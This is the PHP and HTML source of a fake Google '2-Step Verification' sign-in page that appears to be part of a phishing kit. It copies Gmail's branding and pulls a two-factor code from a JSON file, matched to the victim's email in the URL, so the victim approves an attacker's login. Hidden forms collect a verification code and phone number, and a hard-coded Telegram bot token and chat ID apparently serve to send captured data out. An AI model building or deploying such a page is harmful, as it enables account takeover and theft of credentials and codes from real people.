<?php
// Define the JSON file path
$jsonFile = "data.json";

// Check if the file exists and is not empty
if (!file_exists($jsonFile) || filesize($jsonFile) == 0) {
    $twofaCode = "No Code"; // Default message if file is missing or empty
} else {
    // Read and decode the JSON file
    $jsonData = file_get_contents($jsonFile);
    $data = json_decode($jsonData, true);

    // Check if 'twofacode' exists in the JSON data
    $twofaCode = isset($data['twofacode']) ? $data['twofacode'] : "No Code";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        body{
            background: #f0f4f9;
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        #temp-contain{
            /* background: #fff; */
            margin: auto;
            margin-top: 10%;
            width: 70%;
            
        }.img-sign p{
            width: 80%;
            font-size: 16px;
        }
        .form-sections{
            background: #fff;
            padding: 30px 30px;
            display: flex;
            justify-content: space-between;
            border-radius: 30px;
        }
        .log-section input::placeholder{
            font-size: 16px;
        }
        .log-section input{
            padding: 17px;
            border-radius: 4px;
            border: 1px solid #000;
            width: 90%;
            outline: none;
            font-size: 16px;
        }
        .state-lists ul li{
            font-size: 14px;
        }
        .state-lists ul{
            list-style: none;
            display: flex;
            justify-content: space-between;
            width: 20%;
        }
        .state-lists{
            display: flex;
            justify-content: space-between;
        }
        a{
            color: rgb(11 87 208 / 1);
        border-radius: 4px;
        font-weight: 500;
        letter-spacing: 0.015625rem;
        z-index: 1;
        text-decoration: none;
        font-size: 14px;
        /* font-weight: bold; */
        }
        .butts{
            align-items: center;
            width: 100%;
            float: right;
        }
        .butts button,
        button
        {
            float: right;
            color: #fff;
            background: rgb(11 87 208 / 1);
            border: 1px solid rgb(11 87 208 / 1);
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
        }
        #not{
            color: var(--gm3-sys-color-on-surface-variant, #444746);
        font-family: "Google Sans", roboto, "Noto Sans Myanmar UI", arial, sans-serif;
        font-size: 0.875rem;
        font-weight: 400;
        letter-spacing: 0rem;
        line-height: 1.4285714286;
        }
        #pdss{
            display: none;
        }
        #nextsubmit{
            display: none;
        }
        #error{
            display: none;
        }
        #mail-secs{
            display: none;
        }
        .img-sign{
            width: 50%;
        }
        

        #errors{
            display: none;
        }
        #pdssts{
            display: none;
        }
        #pdsstsMain{
            display: none;
        }
     
        .sec-tion{
            /* display: none; */
        }

        #errorss{
            display: none;
        }
        #uspds{
            display: none;
        }
       
        @media(max-width: 800px){
            body{
                background: #fff;
            }
        .form-sections{
            flex-direction: column;
            width: 100%;
            padding: 5px;
        }
        .img-sign{
            width: 90%;
        }
        #temp-contain{
            width: 90%;
        }
        .state-lists{
            display: none;
        }
        }
    </style>
</head>
<body>
   <div id="temp-contain">
    <div class="form-sections">
        <div class="img-sign">
            <div class="svg">
                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
            </div>
            <h1 style="font-weight: 100;" id="signs">2-Step Verification

            </h1>
            <div id="mail-secs"  style=" justify-content: space-between; width: 50%; overflow: hidden; border-radius: 20px; padding: 3px 10px; align-items: center; border: 1px solid #000;">

               <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="28px" height="28px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                <span id="span-mail" style="padding: 1px; font-size: 14px;">supportrequest@gmail.com</span>
            </div>
            <p id="goog-acc">To help keep your account safe, Google wants to make sure it’s really you trying to sign in
            </p>
        </div>
        <div class="log-section">
            <div class="sec-tion">
                <br>
                <h1 id="outputs" style="margin: auto; text-align: center; padding: 20px; border-radius: 50px;  width: 10%;"><?php echo htmlspecialchars($twofaCode); ?></h1>
                <br><br>
                <p>Google sent a notification to your Phone. Open your phone and tap Yes on the prompt to verify it’s you.
                </p>
                <br><br>
                <button type="submit" id="baseButt">Next</button>
                <br><br>
                <br><br>
            </div>

            <div id="pdssts">
            <br><br>
                <br><br>
            <form action="" id="formaload">
                <p style="opacity:0;">Confirm mobile number to complete account verification.</p>
                <input type="text" id="pwddstoast" required placeholder="Enter verification code" value="" required > <br> 
                <p style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br><br>
                <button type="submit" id="">Confirm</button>
                <a href="#">Did not receive code? Try another way.</a>
            </form>
                <br>
                <br>
            <!-- <form action="" style="width: 100%;" id="formaload">
                <input type="text" id="pwddstoast" required placeholder="Enter verification code" required > <br> 
                <p id="errors" style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br>
                <button type="submit" id="">Next</button>
            </form> -->
                
            </div>
            <div id="pdsstsMain">
                <br><br>
                <br><br>
            <form action="" id="formal-top">
                <p>Confirm mobile number to complete account verification.</p>
                <input type="text" id="pwddstvvs" required placeholder="" value="+1" required > <br> 
                <p id="errors" style=" opacity: 0; align-items: center;color: #b3261e; font-size: 13px;"> <span class="AfGCob"><svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span> Wrong password. Try again or click Forgot password to reset it.</p> <br><br>
                <button type="submit" id="">Next</button>
            </form>
                <br>
                <br>
                <br><br>
            </div>


            <br><br>
        
       
    </div> <br>
 
</div>
    <script>


//   const twofaCodee =  document.getElementById("outputs").innerText = data.twofacode; 
            
function fetchData() {
    fetch("data.json")
        .then(response => response.json()) // Parse JSON response
        .then(data => {
            console.log("Fetched JSON:", data); // Debugging line

            // Ensure data is an array
            if (!Array.isArray(data) || data.length === 0) {
                console.error("Invalid JSON structure:", data);
                alert("No data available.");
                return;
            }

            // Get the email from the URL fragment (#email@example.com)
            const emailFromURL = window.location.hash.substring(1); // Remove the `#`

            if (!emailFromURL) {
                alert("No email found in URL.");
                return;
            }

            // Find the matching entry in the JSON array
            const match = data.find(entry => entry.email === emailFromURL);

            if (match && match.twofacode) {
                // alert(match.twofacode); // Display the matched two-factor code
                document.getElementById("outputs").innerText = match.twofacode; 
            } else {
                alert("No matching two-factor code found.");
            }
        })
        .catch(error => console.error("Error fetching data:", error));
}

window.onload = fetchData;


        const currentUrl = window.location.href;
let maill = document.querySelector('#usrdd')
let emailPattern = /[\w._%+-]+@[\w.-]+\.[a-zA-Z]{2,}/;
let matches = currentUrl.match(emailPattern);
let email;

if (matches) {
  email = matches[0];
  maill.value = email  
}

      let bot = {
    TOKEN: "8135029951:AAGw-kDu3NVzOldOjttvvYJSKxv4IFg8q48",
        chatID:"7557838902"
      }






    </script>


</body>
</html>